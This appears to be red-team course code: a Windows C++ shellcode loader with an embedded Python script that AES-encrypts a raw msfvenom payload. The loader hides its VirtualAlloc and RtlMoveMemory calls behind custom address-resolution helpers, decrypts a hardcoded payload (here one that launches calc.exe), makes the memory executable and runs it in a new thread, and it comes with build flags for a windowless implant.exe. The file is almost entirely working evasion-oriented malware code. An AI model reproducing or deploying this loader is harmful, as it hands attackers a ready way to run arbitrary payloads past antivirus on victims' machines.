/*

Based on RTO Course from Sektor 7 Institute. 


@ECHO OFF

cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tp *.cpp /link /OUT:implant.exe /SUBSYSTEM:WINDOWS
del *.obj



 Red Team Operator course code template
 PE binary - payload encryption with AES
 

import sys
from base64 import b64encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import hashlib

#KEY = get_random_bytes(16)


def pad(s):
	return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

def aesenc(plaintext):

    key =  "\xe5\x66\x24\x89\x2a\xe5\x89\xef\x17\x19\x9e\x73\x30\x58\x42\x4e"
    iv = 16 * b'\x00'
    k = hashlib.sha256(key).digest()
    iv = 16 * '\x00'
    plaintext = pad(plaintext)
    cipher = AES.new(k, AES.MODE_CBC, iv)
    return cipher.encrypt(bytes(plaintext))


try:
    plaintext = open(sys.argv[1], "rb").read()
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()

ciphertext = aesenc(plaintext)

#print('AESkey[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };')
print('payload[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')

*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include "helpers.h"

typedef LPVOID (WINAPI * VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
typedef VOID (WINAPI * RtlMoveMemory_t)(VOID UNALIGNED *Destination, const VOID UNALIGNED *Source, SIZE_T Length);


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;
}

// 64-bit notepad
unsigned char key[] = { 0xe5, 0x66, 0x24, 0x89, 0x2a, 0xe5, 0x89, 0xef, 0x17, 0x19, 0x9e, 0x73, 0x30, 0x58, 0x42, 0x4e };

//msfvenom -p windows/x64/exec -a x64 CMD=calc.exe -f raw --platform windows EXITFUNC=thread > calc.bin

unsigned char payload[] = { 0xdb, 0xf7, 0xdb, 0x14, 0x0, 0xb0, 0x34, 0xf6, 0x6, 0xa9, 0xba, 0x4a, 0xb0, 0xd4, 0xe5, 0x65, 0x94, 0xe4, 0x4d, 0x4d, 0x37, 0x19, 0xf4, 0x20, 0xd, 0x51, 0x9b, 0xa2, 0x36, 0xd8, 0x5, 0xcb, 0xf6, 0xed, 0x90, 0x43, 0xd9, 0xf, 0x6d, 0x1b, 0xdf, 0x95, 0x4b, 0x93, 0x8f, 0xbc, 0x1a, 0xf5, 0x8a, 0x90, 0x20, 0x85, 0xbe, 0xe, 0x9e, 0xb7, 0xd9, 0x45, 0x61, 0x53, 0x8d, 0xfc, 0x25, 0x68, 0x40, 0x79, 0x24, 0xaa, 0x5d, 0xe5, 0xaa, 0xcc, 0x66, 0xdd, 0x87, 0xe3, 0x3c, 0x99, 0xbe, 0x4, 0x7e, 0x91, 0xe9, 0xef, 0x9, 0x86, 0x2d, 0xd4, 0x64, 0x56, 0xd5, 0x5a, 0x9c, 0x3e, 0x1a, 0x24, 0x69, 0xd0, 0x7c, 0xba, 0x45, 0xb6, 0xae, 0x66, 0xad, 0x84, 0x28, 0x3, 0xab, 0xa1, 0x59, 0xea, 0xa, 0x62, 0x83, 0x5, 0xd8, 0x46, 0x21, 0xfd, 0x41, 0x1f, 0xae, 0x1c, 0x7, 0xdf, 0x72, 0x8e, 0x37, 0x96, 0xf9, 0x4b, 0xbd, 0xdf, 0x3f, 0x18, 0x37, 0x4b, 0x43, 0x97, 0x94, 0xc2, 0x8d, 0x6, 0x79, 0x2f, 0x47, 0x6, 0xb8, 0x14, 0x27, 0xe5, 0x94, 0x62, 0xd7, 0x4, 0x7e, 0x3d, 0x26, 0x90, 0xba, 0x4b, 0x27, 0x91, 0x92, 0x0, 0xda, 0x59, 0xf4, 0x13, 0xce, 0x54, 0xdf, 0x8, 0xf8, 0x76, 0xd8, 0xfb, 0x9e, 0x4a, 0x45, 0xc8, 0x14, 0xa1, 0xc, 0x97, 0x1f, 0x3a, 0x10, 0xdf, 0x33, 0xf4, 0xf4, 0x36, 0x99, 0x6f, 0xba, 0x9d, 0xb7, 0xf2, 0xd3, 0xb9, 0x70, 0x39, 0xcf, 0x71, 0x1f, 0xe0, 0xbe, 0x33, 0x4f, 0x7, 0x7c, 0x5e, 0x81, 0x55, 0xfd, 0x6, 0x2, 0x97, 0x2d, 0xce, 0x6c, 0x1d, 0xce, 0xc6, 0x92, 0x57, 0xee, 0x8b, 0x6d, 0x69, 0x69, 0x3f, 0x38, 0x47, 0xc6, 0x37, 0xf4, 0xe3, 0x70, 0x8f, 0x8a, 0xaf, 0xeb, 0xe4, 0x82, 0xd0, 0xc7, 0xe9, 0xfc, 0xeb, 0x4, 0xa4, 0x23, 0xda, 0x14, 0x34, 0x1b, 0x38, 0xfe, 0xd6, 0x37, 0xb, 0xac, 0x24, 0xcd, 0x58, 0x97, 0xee, 0x86, 0x8, 0xd7, 0x6a, 0xba, 0x70, 0xad, 0xa4, 0x59, 0x52, 0xd9, 0x4c, 0x88, 0x93, 0xd5, 0x1c, 0xe6, 0xd3 };

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	// resolve functions addresses
	//VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t) GetProcAddress(GetModuleHandle("KERNEL32.DLL"), "VirtualAlloc");	
	//RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t) GetProcAddress(GetModuleHandle("KERNEL32.DLL"), "RtlMoveMemory");

	VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "VirtualAlloc");
	RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "RtlMoveMemory");

	unsigned int payload_len = sizeof(payload);
	
	// Allocate memory for payload
	exec_mem = pVirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Decrypt payload
	AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
	
	// Copy payload to allocated buffer
	pRtlMoveMemory(exec_mem, payload, payload_len);
	
	// Make the buffer executable
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	// If all good, launch the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}
